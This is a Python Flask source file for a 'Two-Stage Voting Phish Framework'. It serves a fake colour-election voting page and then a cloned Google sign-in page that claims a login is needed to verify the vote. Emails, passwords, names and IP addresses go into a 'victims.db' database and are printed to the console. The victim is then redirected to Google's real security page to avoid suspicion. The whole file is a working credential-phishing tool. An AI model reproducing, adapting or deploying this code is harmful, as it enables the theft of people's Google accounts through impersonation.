from flask import Flask, request, redirect, render_template_string, session
import sqlite3
from datetime import datetime
from user_agents import parse
import os

app = Flask(__name__)
app.secret_key = "japhet_super_secret_key_2026"

# --- CUSTOM BANNER ---
BANNER = """
\033[93m
  ██╗ █████╗ ██████╗ ██╗  ██╗███████╗████████╗
  ██║██╔══██╗██╔══██╗██║  ██║██╔════╝╚══██╔══╝
  ██║███████║██████╔╝███████║█████╗     ██║   
██╗██║██╔══██║██╔═══╝ ██╔══██║██╔══╝     ██║   
╚█████║██║  ██║██║     ██║  ██║███████╗   ██║   
 ╚════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   
      [ Two-Stage Voting Phish Framework ]
          [ Coded by Japhet Abdallah ]
\033[0m
"""

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    # Table for voting data
    c.execute('''CREATE TABLE IF NOT EXISTS votes
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip TEXT,
                  voter_name TEXT,
                  favorite_color TEXT)''')
    # Table for Google creds
    c.execute('''CREATE TABLE IF NOT EXISTS creds
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip TEXT,
                  email TEXT,
                  password TEXT)''')
    conn.commit()
    conn.close()

# --- STAGE 1: THE GOLD VOTING PAGE ---
HTML_VOTE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official Color Election 2026</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a1a, #333333);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .vote-box {
            background: #222;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.2);
            border: 2px solid #d4af37;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h1 {
            color: #d4af37;
            margin-bottom: 10px;
            font-size: 26px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        p {
            color: #bbb;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #d4af37;
            font-weight: bold;
            font-size: 14px;
        }
        input[type="text"], select {
            width: 100%;
            padding: 12px;
            background: #111;
            border: 1px solid #555;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        input[type="text"]:focus, select:focus {
            border-color: #d4af37;
        }
        .btn {
            background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c);
            color: #000;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.4);
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: scale(1.02);
        }
    </style>
</head>
<body>
    <div class="vote-box">
        <h1>Color Election</h1>
        <p>Cast your vote for the official color of the year.</p>
        <form method="POST" action="/vote">
            <div class="input-group">
                <label>Your Full Name</label>
                <input type="text" name="voter_name" placeholder="Enter your name" required>
            </div>
            <div class="input-group">
                <label>Favourite Colour</label>
                <select name="favorite_color" required>
                    <option value="" disabled selected>Select a color</option>
                    <option value="Gold">Gold</option>
                    <option value="Silver">Silver</option>
                    <option value="Blue">Blue</option>
                    <option value="Red">Red</option>
                    <option value="Black">Black</option>
                </select>
            </div>
            <button type="submit" class="btn">Submit Vote</button>
        </form>
    </div>
</body>
</html>
"""

# --- STAGE 2: THE GOOGLE LOGIN PAGE ---
HTML_GOOGLE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { width: 100%; max-width: 448px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
        .logo { width: 75px; height: 24px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; color: #202124; }
        .subtitle { font-size: 16px; color: #202124; margin-bottom: 32px; }
        .input-group { position: relative; margin-bottom: 24px; text-align: left; }
        .input-group input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; outline: none; transition: border 0.2s; }
        .input-group input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
        .link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
        .btn { background-color: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
        .btn:hover { background-color: #1557b0; }
        .security-note { margin-top: 20px; font-size: 13px; color: #5f6368; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="login-container">
        <svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
            <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
            <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
            <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
            <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
            <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-12.85 9.58-22.18 21.08-22.18 11.59 0 17.23 9.16 19.07 14.12l1.01 2.52-33.32 13.78c2.55 5.03 6.54 7.6 12.1 7.6 5.72 0 9.66-2.87 12.99-8.53zm-26.16-7.98l22.27-9.24c-1.23-3.11-4.92-5.29-9.34-5.29-5.88 0-11.09 4.2-11.09 11.09 0 1.01.17 2.01.5 2.94 2.01 1.01 2.66-.51 2.66-.51z" fill="#EA4335"/>
        </svg>
        
        <h1>Sign in</h1>
        <div class="subtitle">to finalize your vote</div>
        <p class="security-note">To prevent spam and ensure a fair election, please sign in with your Google account to verify your identity.</p>

        <form method="POST" action="/google_login">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required autofocus>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="actions">
                <a class="link">Forgot email?</a>
                <button type="submit" class="btn">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
"""

# --- ROUTES ---
@app.route('/')
def index():
    return render_template_string(HTML_VOTE)

@app.route('/vote', methods=['POST'])
def vote():
    voter_name = request.form.get('voter_name')
    favorite_color = request.form.get('favorite_color')
    ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Save vote data
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("INSERT INTO votes (timestamp, ip, voter_name, favorite_color) VALUES (?, ?, ?, ?)",
              (timestamp, ip, voter_name, favorite_color))
    conn.commit()
    conn.close()

    print(f"\033[93m[+] VOTE CAPTURED: {voter_name} voted for {favorite_color}\033[0m")

    # Move to Stage 2
    return render_template_string(HTML_GOOGLE)

@app.route('/google_login', methods=['POST'])
def google_login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Save Google creds
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("INSERT INTO creds (timestamp, ip, email, password) VALUES (?, ?, ?, ?)",
              (timestamp, ip, email, password))
    conn.commit()
    conn.close()

    print(f"\033[92m[+] JAPHET'S TOOL CAPTURED -> {email} | {password} | {ip}\033[0m")

    # Final redirect
    return redirect("https://myaccount.google.com/security")

if __name__ == '__main__':
    print(BANNER)
    if not os.path.exists('victims.db'):
        init_db()
    else:
        init_db() # Re-run to ensure tables exist
    print("\033[96m[*] Server running on http://0.0.0.0:8080\033[0m")
    app.run(host='0.0.0.0', port=8080, debug=False)

